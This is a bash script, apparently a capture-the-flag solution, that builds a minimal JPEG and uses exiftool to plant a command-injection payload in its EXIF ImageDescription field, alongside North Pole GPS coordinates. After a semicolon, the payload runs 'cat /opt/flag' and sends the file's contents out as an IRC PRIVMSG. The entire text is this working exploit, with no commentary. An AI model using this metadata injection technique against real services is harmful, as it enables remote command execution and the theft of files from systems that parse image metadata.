#!/bin/bash

cmd="echo PRIVMSG Steven :\$(cat /opt/flag)"

rm -f orig.jpg exploit.jpg

xxd -r > orig.jpg <<EOF
00000000: ffd8 ffdb 0043 0003 0202 0202 0203 0202  .....C..........
00000010: 0203 0303 0304 0604 0404 0404 0806 0605  ................
00000020: 0609 080a 0a09 0809 090a 0c0f 0c0a 0b0e  ................
00000030: 0b09 090d 110d 0e0f 1010 1110 0a0c 1213  ................
00000040: 1210 130f 1010 10ff c900 0b08 0001 0001  ................
00000050: 0101 1100 ffcc 0006 0010 1005 ffda 0008  ................
00000060: 0101 0000 3f00 d2cf 20ff d9              ....?... ..
EOF

exiftool -IFD0:ImageDescription="santa;$cmd" -XMP:GPSLatitude="90" -XMP:GPSLongitude="0" -GPSLongitudeRef="W" -GPSLatitudeRef="N" -gpsaltituderef="above" orig.jpg -o exploit.jpg

